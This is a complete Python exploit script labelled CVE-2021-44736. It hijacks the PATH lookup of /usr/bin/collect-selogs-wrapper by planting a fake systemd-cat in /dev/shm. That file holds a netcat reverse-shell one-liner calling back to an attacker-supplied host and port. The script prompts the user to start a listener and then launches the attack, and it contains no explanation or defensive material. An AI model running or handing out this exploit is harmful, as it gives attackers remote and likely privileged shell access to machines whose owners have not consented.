#!/usr/bin/python3

import sys
import getopt
import os

usage_string = "Usage: python cve-2021-44736.py -r <rhost> -p <rport>"


def attack(rhost, rport):

    payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {rhost} {rport} >/tmp/f".format(
        rhost=rhost, rport=rport
    )

    with open("/dev/shm/systemd-cat", "w") as f:
        f.write("#!/bin/sh\n")
        f.write(payload)

    exploit = "chmod +x /dev/shm/systemd-cat; PATH=/dev/shm:$PATH; /usr/bin/collect-selogs-wrapper;"

    os.system(exploit)


def main(argv):
    rhost = None
    rport = None
    try:
        opts, args = getopt.getopt(argv, "hr:p:")
    except getopt.GetoptError:
        print(usage_string)
        sys.exit(1)
    for opt, arg in opts:
        if opt == "-h":
            print(usage_string)
            sys.exit()
        elif opt == "-r":
            rhost = arg
        elif opt == "-p":
            rport = arg

    if rhost is None or rport is None:
        print(usage_string)
        sys.exit(1)

    input(
        "Start listener on the {rhost}:{rport} and press Enter to continue".format(
            rhost=rhost, rport=rport
        )
    )
    print("Exploiting...")
    attack(rhost, rport)
    print("Exploitation finished, check listener")


if __name__ == "__main__":
    main(sys.argv[1:])
